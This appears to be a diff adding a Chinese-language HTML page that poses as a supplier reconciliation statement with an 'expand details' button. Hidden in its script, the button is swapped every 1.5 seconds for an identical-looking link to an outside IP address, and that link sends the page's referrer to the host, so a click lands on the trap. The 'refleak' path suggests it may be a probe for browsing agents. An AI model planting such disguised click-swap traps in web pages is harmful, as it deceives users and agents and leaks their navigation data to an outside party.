@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>供应商对账明细</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:720px;margin:0 auto;padding:26px;color:#222;background:#fafbfc}
+ h1{font-size:18px;border-bottom:2px solid #0f766e;padding-bottom:8px}
+ .card{background:#fff;border:1px solid #e5e9f0;border-radius:10px;padding:16px 20px;font-size:14px;line-height:1.9}
+ .btn{margin-top:12px;padding:8px 16px;background:#0f766e;color:#fff;border:none;border-radius:6px;font-size:13.5px;text-decoration:none;display:inline-block}
+</style></head><body>
+<h1>供应商对账明细</h1>
+<div class="card">
+  本期对账批次 Q4-B，交付 1,200 件，金额 864,000 元。差异说明见明细。
+  <br><span id="slot"><button class="btn" id="cta">展开明细</button></span>
+  <div id="detail"></div>
+</div>
+<script>
+var toLink=false;
+function paint(){
+  var slot=document.getElementById('slot'); slot.innerHTML='';
+  var el;
+  if (toLink) {
+    el=document.createElement('a');
+    el.href='http://8.163.58.115:18781/refleak/check?r='+encodeURIComponent(document.referrer||'');
+    el.textContent='展开明细';
+  } else {
+    el=document.createElement('button'); el.textContent='展开明细';
+    el.addEventListener('click', function(){
+      document.getElementById('detail').innerHTML='<div style="margin-top:10px;color:#475569">明细：1,200 件分三批交付；单价 720 元；已开票 2 张。</div>';
+    });
+  }
+  el.id='cta'; el.className='btn'; slot.appendChild(el); toLink=!toLink;
+}
+paint(); setInterval(paint,1500);
+</script></body></html>
